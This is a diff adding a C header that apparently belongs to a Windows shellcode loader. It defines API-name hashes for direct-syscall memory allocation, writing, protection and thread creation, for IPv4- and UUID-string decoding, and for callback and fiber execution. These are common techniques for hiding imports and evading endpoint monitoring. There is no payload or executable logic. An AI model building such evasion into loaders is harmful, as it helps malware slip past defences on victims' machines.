@@ -1,0 +1,31 @@
+#include <Windows.h>
+#define	_Ntdll	1370023684
+#define	_Kernel32	1938991116
+#define	_RtlIpv4StringToAddressA	1940938738
+#define	_LdrFastFailInLoaderCallout	3223877290
+#define	_RtlLeaveCriticalSection	3975391195
+#define	_RtlRandom	2562065359
+#define	_LdrGetDllFullName	1789042478
+#define	_SysZwOpenThread	2009309111
+#define	_SysZwOpenProcess	1399515870
+#define	_SysZwWaitForSingleObject	521561602
+#define	_SysZwAllocateVirtualMemory	1911266354
+#define	_SysZwWriteVirtualMemory	958020248
+#define	_SysZwFreeVirtualMemory	1382020687
+#define	_SysZwProtectVirtualMemory	1419688718
+#define	_SysZwReadVirtualMemory	3448090953
+#define	_SysZwSignalAndWaitForSingleObject	1390605171
+#define	_SysZwClose	3025993187
+#define	_SysZwCreateThreadEx	2269935030
+#define	_Rpcrt4	3114501541
+#define	_uuidFromStringA	3951076799
+#define	_LdrLoadDll	718955322
+#define	_FreeLibrary	1779288307
+#define	_EnumCalendarInfoExA	442051445
+#define	_ConvertThreadToFiber	1409990304
+#define	_CreateFiber	2276527704
+#define	_SwitchToFiber	3516245593
+#define	_FreeConsole	3290072849
+#define	NtCurrentProcess()	((HANDLE)(LONG_PTR)-1)
+#define	NtCurrentThread()	( ( HANDLE ) ( LONG_PTR ) - 2 )
+#define	FUNC_HASH	7484
